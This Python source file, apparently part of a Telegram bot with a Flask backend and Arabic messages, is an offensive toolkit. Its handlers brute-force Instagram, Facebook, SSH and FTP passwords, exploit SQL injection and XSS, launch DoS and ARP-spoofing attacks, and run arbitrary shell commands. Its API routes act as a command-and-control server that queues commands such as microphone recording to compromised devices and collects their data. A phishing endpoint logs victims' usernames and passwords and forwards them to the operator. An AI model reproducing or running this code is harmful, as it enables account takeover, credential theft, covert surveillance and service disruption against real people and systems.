        if text.lower() == 'default':
            passwords = ['123456', 'password', '123456789', 'qwerty', 'abc123', 'admin', 'welcome', 'monkey', 'dragon', 'master']
        else:
            passwords = [p.strip() for p in text.split(',')]
        safe_send(chat_id, f"جاري تخمين كلمة سر انستغرام لـ {username} ...")
        result = brute_force_instagram(username, passwords, max_attempts=len(passwords))
        if result['success']:
            safe_send(chat_id, f"تم العثور على كلمة السر: {result['credentials']['password']}")
        else:
            safe_send(chat_id, f"فشل التخمين. تم تجربة {result['attempts']} كلمة سر")
        user_states[chat_id] = None
        return

    if state == "waiting_ssh_target":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_ssh_password_list"
        user_states[f"{chat_id}_ssh_target"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default'")
        return
    if state == "waiting_ssh_password_list":
        if not is_admin(chat_id):
            return
        target = user_states.get(f"{chat_id}_ssh_target")
        if text.lower() == 'default':
            passwords = ['123456', 'password', 'admin', 'root', 'qwerty']
        else:
            passwords = [p.strip() for p in text.split(',')]
        parts = target.split('|')
        if len(parts) == 2:
            ip, username = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"جاري تخمين SSH على {ip} ...")
            result = brute_force_ssh(ip, username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"تم اختراق SSH! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"فشل اختراق SSH. تم تجربة {result['attempts']} كلمة سر")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    if state == "waiting_ftp_target":
        if not is_admin(chat_id):
            return
        user_states[chat_id] = "waiting_ftp_password_list"
        user_states[f"{chat_id}_ftp_target"] = text
        safe_send(chat_id, "أرسل قائمة كلمات السر أو 'default'")
        return
    if state == "waiting_ftp_password_list":
        if not is_admin(chat_id):
            return
        target = user_states.get(f"{chat_id}_ftp_target")
        if text.lower() == 'default':
            passwords = ['123456', 'password', 'admin', 'ftp', 'qwerty']
        else:
            passwords = [p.strip() for p in text.split(',')]
        parts = target.split('|')
        if len(parts) == 2:
            ip, username = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"جاري تخمين FTP على {ip} ...")
            result = brute_force_ftp(ip, username, passwords, max_attempts=len(passwords))
            if result['success']:
                safe_send(chat_id, f"تم اختراق FTP! المستخدم: {username}, كلمة السر: {result['credentials']['password']}")
            else:
                safe_send(chat_id, f"فشل اختراق FTP. تم تجربة {result['attempts']} كلمة سر")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    if state == "waiting_custom_bruteforce":
        if not is_admin(chat_id):
            return
        parts = text.split('|')
        if len(parts) >= 2:
            target = parts[0].strip()
            platform_type = parts[1].strip().lower()
            passwords = parts[2].split(',') if len(parts) > 2 else ['123456', 'password']
            if platform_type == 'facebook':
                result = brute_force_facebook(target, passwords)
            elif platform_type == 'instagram':
                result = brute_force_instagram(target, passwords)
            elif platform_type == 'ssh':
                ip, user = target.split(':')
                result = brute_force_ssh(ip, user, passwords)
            elif platform_type == 'ftp':
                ip, user = target.split(':')
                result = brute_force_ftp(ip, user, passwords)
            else:
                result = {'success': False, 'attempts': len(passwords)}
            if result['success']:
                safe_send(chat_id, f"تم الاختراق! البيانات: {result['credentials']}")
            else:
                safe_send(chat_id, f"فشل الاختراق. تم تجربة {result['attempts']} كلمة سر")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    if state == "waiting_download":
        if not is_admin(chat_id):
            return
        safe_send(chat_id, "جاري تحميل الفيديو...")
        filename, error = download_video(text)
        if filename:
            try:
                with open(filename, 'rb') as f:
                    bot.send_video(chat_id, f, caption="تم التحميل")
                os.remove(filename)
            except Exception as e:
                safe_send(chat_id, f"فشل إرسال الفيديو: {str(e)}")
        else:
            safe_send(chat_id, f"فشل التحميل: {error}")
        user_states[chat_id] = None
        return

    if state == "waiting_portscan":
        if not is_admin(chat_id):
            return
        safe_send(chat_id, f"جاري مسح منافذ {text} ...")
        open_ports = port_scan(text)
        if open_ports:
            safe_send(chat_id, f"المنافذ المفتوحة: {open_ports}")
        else:
            safe_send(chat_id, "لا توجد منافذ مفتوحة أو فشل المسح")
        user_states[chat_id] = None
        return

    if state == "waiting_ssl":
        if not is_admin(chat_id):
            return
        safe_send(chat_id, f"جاري فحص SSL لـ {text} ...")
        result = ssl_scan(text)
        if result['valid']:
            msg = f"شهادة SSL صالحة حتى: {result['not_after']}\nالجهة المصدرة: {result['issuer']}"
            safe_send(chat_id, msg)
        else:
            safe_send(chat_id, f"فشل فحص SSL: {result.get('error', 'خطأ غير معروف')}")
        user_states[chat_id] = None
        return

    if state == "waiting_sqli_hack":
        if not is_admin(chat_id):
            return
        result = comprehensive_exploit(text)
        sqli_findings = [e for e in result.get('exploited', []) if e['type'] == 'SQL Injection']
        if sqli_findings:
            msg = "تم العثور على ثغرات SQL Injection:\n"
            for f in sqli_findings:
                msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
            msg += "\nتم استغلالها بنجاح"
        else:
            msg = "لم يتم العثور على ثغرات SQL Injection"
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return

    if state == "waiting_xss_hack":
        if not is_admin(chat_id):
            return
        result = comprehensive_exploit(text)
        xss_findings = [e for e in result.get('exploited', []) if e['type'] == 'XSS']
        if xss_findings:
            msg = "تم العثور على ثغرات XSS:\n"
            for f in xss_findings:
                msg += f"المعامل: {f['parameter']}, الحمولة: {f['payload']}\n"
            msg += "\nتم استغلالها بنجاح"
        else:
            msg = "لم يتم العثور على ثغرات XSS"
        safe_send(chat_id, msg)
        user_states[chat_id] = None
        return

    if state == "waiting_dos":
        if not is_admin(chat_id):
            return
        parts = text.split('|')
        if len(parts) >= 2:
            target = parts[0].strip()
            port = int(parts[1]) if parts[1].isdigit() else 80
            duration = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
            safe_send(chat_id, f"بدء هجوم DoS على {target}:{port} لمدة {duration} ثانية...")
            result = dos_attack(target, port, duration)
            if result['status'] == 'completed':
                safe_send(chat_id, f"انتهى الهجوم. تم إرسال {result['packets_sent']} حزمة")
            else:
                safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    if state == "waiting_arp":
        if not is_admin(chat_id):
            return
        parts = text.split('|')
        if len(parts) == 2:
            target_ip, gateway_ip = parts[0].strip(), parts[1].strip()
            safe_send(chat_id, f"بدء هجوم ARP Spoofing على {target_ip} عبر البوابة {gateway_ip} ...")
            result = arp_spoof(target_ip, gateway_ip)
            if result['status'] == 'success':
                safe_send(chat_id, "تم تنفيذ الهجوم بنجاح")
            else:
                safe_send(chat_id, f"فشل الهجوم: {result.get('error', 'خطأ غير معروف')}")
        else:
            safe_send(chat_id, "صيغة غير صحيحة")
        user_states[chat_id] = None
        return

    if state == "waiting_shell":
        if not is_admin(chat_id):
            return
        try:
            result = subprocess.run(text, shell=True, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            if len(output) > 4000:
                output = output[:4000] + "\n... (مقطوع)"
            safe_send(chat_id, f"نتيجة الأمر:\n{output}")
        except Exception as e:
            safe_send(chat_id, f"خطأ: {str(e)}")
        user_states[chat_id] = None
        return

    if state == "waiting_mic_duration":
        if not is_admin(chat_id):
            return
        try:
            duration = int(text)
            device_id = admin_remote.get(chat_id)
            if device_id:
                add_command(device_id, f"RECORD_AUDIO:{duration}")
                safe_send(chat_id, f"تم إرسال أمر التسجيل لمدة {duration} ثانية للجهاز {device_id}")
            else:
                safe_send(chat_id, "لم يتم تحديد جهاز")
        except:
            safe_send(chat_id, "يرجى إدخال رقم صحيح")
        user_states[chat_id] = None
        return

    if state is None:
        # إعادة توجيه الرسالة للمطور إذا كان المستخدم محظوراً
        if is_banned(chat_id):
            safe_send(chat_id, "الدردشة مقفلة. يرجى التواصل مع المطور")
            notify_admin(f"رسالة من مستخدم محظور {chat_id}: {text}")
            return
        safe_send(chat_id, "اختر خدمة من القائمة:", reply_markup=build_main_menu(chat_id))

# ===================== معالج الملفات =====================
@bot.message_handler(content_types=['document'])
def handle_documents(message):
    chat_id = message.chat.id
    state = user_states.get(chat_id)
    file = message.document
    file_name = file.file_name or "بدون اسم"

    if state in ["waiting_pdf_summary", "waiting_pdf_extract", "waiting_pdf_smart"]:
        if not file_name.lower().endswith('.pdf'):
            safe_send(chat_id, "يرجى إرسال ملف PDF")
            return
        safe_send(chat_id, "جاري تحليل الملف...")
        file_info = bot.get_file(file.file_id)
        downloaded = bot.download_file(file_info.file_path)
        pdf_text = extract_pdf_text(downloaded)
        if not pdf_text:
            safe_send(chat_id, "فشل استخراج النص من الملف")
            user_states[chat_id] = None
            return
        pdf_texts[chat_id] = pdf_text
        if state == "waiting_pdf_summary":
            summary = summarize_pdf_text(pdf_text, 6)
            safe_send(chat_id, f"ملخص PDF:\n{summary}")
        elif state == "waiting_pdf_extract":
            chunks = split_text_into_chunks(pdf_text, 3000)
            msg = f"نصوص PDF المستخرجة:\nعدد الأحرف: {len(pdf_text)}\nعدد الأجزاء: {len(chunks)}\n\n"
            for i, chunk in enumerate(chunks[:3]):
                msg += f"الجزء {i+1}:\n{chunk[:500]}...\n\n"
            if len(chunks) > 3:
                msg += f"... وعرض {len(chunks)-3} أجزاء أخرى"
            safe_send(chat_id, msg)
        elif state == "waiting_pdf_smart":
            safe_send(chat_id, "تم تحليل الملف بنجاح\nالآن يمكنك طرح أي سؤال عن المحتوى (اكتب سؤالك)")
            user_states[chat_id] = "waiting_pdf_question"
            return
        user_states[chat_id] = None
        return

    if state == "waiting_pdf_question":
        safe_send(chat_id, "يرجى كتابة سؤالك عن الملف (نصي)")
        return

    if state == "waiting_apk_analysis":
        if not file_name.lower().endswith('.apk'):
            safe_send(chat_id, "يرجى إرسال ملف APK")
            return
        safe_send(chat_id, "جاري تحليل الملف...")
        file_info = bot.get_file(file.file_id)
        downloaded = bot.download_file(file_info.file_path)
        result = analyze_apk(downloaded, file_name)
        if result.get('error'):
            safe_send(chat_id, f"فشل التحليل: {result['error']}")
        else:
            msg = f"نتيجة فحص APK:\nالملف: {file_name}\nضار: {result.get('malicious', 0)}\nمشبوه: {result.get('suspicious', 0)}\nآمن: {result.get('harmless', 0)}\nغير مكتشف: {result.get('undetected', 0)}"
            if result.get('malicious', 0) > 0:
                msg += "\nتحذير: تم اكتشاف برمجيات خبيثة!"
            elif result.get('suspicious', 0) > 0:
                msg += "\nتنبيه: يوجد عناصر مشبوهة"
            else:
                msg += "\nالملف يبدو آمناً"
            safe_send(chat_id, msg)
        user_states[chat_id] = None
        return

    safe_send(chat_id, "تم استلام الملف. استخدم الأزرار المناسبة لتحليل PDF أو APK")

# ===================== معالج أسئلة PDF =====================
@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_pdf_question", content_types=['text'])
def handle_pdf_question(message):
    chat_id = message.chat.id
    question = message.text.strip()
    pdf_text = pdf_texts.get(chat_id)
    if not pdf_text:
        safe_send(chat_id, "لم يتم تحميل أي ملف PDF. أرسل ملفاً أولاً")
        user_states[chat_id] = None
        return
    if len(question) < 3:
        safe_send(chat_id, "السؤال قصير جداً. اكتب سؤالاً واضحاً")
        return
    safe_send(chat_id, "جاري البحث عن الإجابة...")
    answer = smart_pdf_search(pdf_text, question)
    safe_send(chat_id, f"الإجابة:\n{answer}")

# ===================== دوال الأجهزة والأوامر =====================
def add_command(device_id, command):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO commands (device_id, command, created_at, executed) VALUES (?, ?, ?, 0)",
              (device_id, command, datetime.now().isoformat()))
    conn.commit()
    conn.close()

# ===================== مسارات API الأساسية =====================
@app.route('/register_device', methods=['POST'])
@limiter.limit("10 per minute")
def register_device():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO targets (device_id, name, type, ip, os, status, last_seen) VALUES (?, ?, ?, ?, ?, 'online', ?)",
              (device_id, data.get('name', 'Unknown'), data.get('type', 'unknown'), data.get('ip'), data.get('os'), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    notify_admin(f"جهاز جديد متصل: {data.get('name')} ({device_id})")
    return jsonify({'status': 'success'}), 200

@app.route('/get_command', methods=['GET'])
@limiter.limit("30 per minute")
def get_command():
    device_id = request.args.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT id, command FROM commands WHERE device_id = ? AND executed = 0 ORDER BY created_at LIMIT 1", (device_id,))
    row = c.fetchone()
    if row:
        c.execute("UPDATE commands SET executed = 1 WHERE id = ?", (row[0],))
        conn.commit()
        conn.close()
        return jsonify({'cmd': row[1], 'param': ''}), 200
    conn.close()
    return jsonify({'cmd': '', 'param': ''}), 200

@app.route('/submit_result', methods=['POST'])
@limiter.limit("30 per minute")
def submit_result():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Invalid data'}), 400
    device_id = data.get('device_id')
    if not device_id:
        return jsonify({'error': 'device_id required'}), 400
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE targets SET last_seen = ?, status = 'online' WHERE device_id = ?", (datetime.now().isoformat(), device_id))
    c.execute("INSERT INTO collected_data (device_id, data_type, data, created_at) VALUES (?, ?, ?, ?)",
              (device_id, data.get('type', 'unknown'), json.dumps(data.get('data', {})), datetime.now().isoformat()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'success'}), 200

@app.route('/phishing_capture', methods=['POST'])
@limiter.limit("10 per minute")
def phishing_capture():
    ip = request.remote_addr
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                  ('', platform, username, password, ip, datetime.now().isoformat()))
        conn.commit()
        conn.close()
        notify_admin(f"بيانات تصيد جديدة!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}\nIP: {ip}")
        return """
        <html>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>تم تسجيل الدخول بنجاح</h2>
            <p>جاري تحويلك إلى الصفحة الرئيسية...</p>
            <script>setTimeout(function(){ window.location.href = "https://www.google.com"; }, 2000);</script>
        </body>
        </html>
        """
    except Exception as e:
        return f"حدث خطأ: {str(e)}"

@app.route('/health')
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()})

# ===================== دالة Keep-Alive =====================
def keep_alive():
    while True:
        time.sleep(120)
        try:
            requests.get(f"http://localhost:{PORT}/health", timeout=5)
        except:
            pass

# ===================== تشغيل البوت =====================

if __name__ == '__main__':
    # إزالة أي webhook قديم
    bot.remove_webhook()
    time.sleep(2)
    
    # بدء خيط Keep-Alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # تشغيل البوت
    def run_bot():
        while True:
            try:
                bot.polling(
                    none_stop=True,
                    interval=0,
                    timeout=60,
                    long_polling_timeout=60,
                    skip_pending=True
                )
            except Exception as e:
                logging.error(f"Bot polling error: {e}")
                time.sleep(5)
    
    threading.Thread(target=run_bot, daemon=True).start()
    
    # تشغيل Flask
    app.run(host='0.0.0.0', port=PORT, debug=False)
